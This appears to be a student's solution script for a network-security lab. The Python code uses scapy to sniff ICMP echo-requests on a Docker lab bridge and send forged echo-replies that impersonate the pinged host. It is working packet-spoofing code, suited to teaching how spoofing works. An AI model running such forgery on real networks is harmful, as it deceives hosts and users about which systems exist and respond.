#!/usr/bin/env python3
"""
Lab 5 — Sniffing and Spoofing
Task: Sniff-then-spoof — forge ICMP echo-replies for any echo-request
Description:
    Listens for ICMP echo-request packets and immediately sends a forged
    echo-reply on behalf of the destination host, regardless of whether
    that host actually exists.

    Three test scenarios from the lab:
      1. ping 1.2.3.4  (non-existent host on a remote network)
         Normally: no reply (unreachable).
         With this script: forged reply arrives — ping succeeds.

      2. ping 10.9.0.99  (non-existent host on the local Docker network)
         Normally: no reply (no ARP response from .99).
         With this script: forged reply arrives — ping succeeds.

      3. ping 8.8.8.8  (real Google DNS server on the Internet)
         Normally: real reply arrives AND our forged reply also arrives.
         With this script: two replies per ping — one real, one forged.

    Must be run as root:
        sudo python3 sniff_spoof.py
"""

from scapy.all import IP, ICMP, sniff, send, Packet

INTERFACE = "br-551f268b0f64"   # Docker bridge interface for the lab network

# =============================================================================
# Callback: forge an ICMP echo-reply for every sniffed echo-request
# =============================================================================

def spoof_pkt(pkt: Packet) -> None:
    """
    Invoked for each ICMP packet matching the BPF filter.

    Only processes echo-requests (type 8); ignores echo-replies (type 0)
    to avoid an infinite loop (our own forged replies would trigger this
    callback again).
    """
    # Filter: only handle ICMP echo-requests (type=8)
    if not (pkt.haslayer(ICMP) and pkt[ICMP].type == 8):
        return   # Skip echo-replies, unreachable messages, etc.

    # ------------------------------------------------------------------
    # Extract fields from the sniffed request
    # ------------------------------------------------------------------
    src_ip   = pkt[IP].src        # Original sender (will receive our reply)
    dst_ip   = pkt[IP].dst        # The host being pinged (we impersonate it)
    icmp_id  = pkt[ICMP].id       # ICMP identifier (matches request to reply)
    icmp_seq = pkt[ICMP].seq      # Sequence number (increments each ping)

    print(f"Original Packet: {src_ip} -> {dst_ip}  "
          f"(ICMP id={icmp_id}, seq={icmp_seq})")

    # ------------------------------------------------------------------
    # Craft the forged reply
    # ------------------------------------------------------------------
    # IP layer: src and dst are SWAPPED relative to the request.
    # We pretend to be dst_ip replying to src_ip.
    ip_layer   = IP(src=dst_ip, dst=src_ip)

    # ICMP layer: type=0 is echo-reply; id and seq must match the request
    # so the sender's ping utility pairs the reply with the correct request.
    icmp_layer = ICMP(
        type=0,          # 0 = echo-reply
        id=icmp_id,      # Must match the request
        seq=icmp_seq,    # Must match the request
    )

    # Build the packet (no payload — a bare reply is sufficient)
    reply = ip_layer / icmp_layer

    # ------------------------------------------------------------------
    # Send the forged reply
    # ------------------------------------------------------------------
    send(reply, verbose=False)   # verbose=False suppresses "Sent 1 packets."

    print(f"Spoofed Reply  : {dst_ip} -> {src_ip}  "
          f"(ICMP type=0, id={icmp_id}, seq={icmp_seq})")
    print("-" * 60)

# =============================================================================
# Start sniffing
# =============================================================================

print(f"[*] Sniff-then-spoof active on '{INTERFACE}' ...")
print(f"[*] Forging ICMP echo-replies for all echo-requests.")
print(f"[*] Press Ctrl+C to stop.\n")

sniff(
    iface=INTERFACE,
    filter="icmp",       # BPF: capture only ICMP packets
    prn=spoof_pkt,       # Callback for each captured packet
)
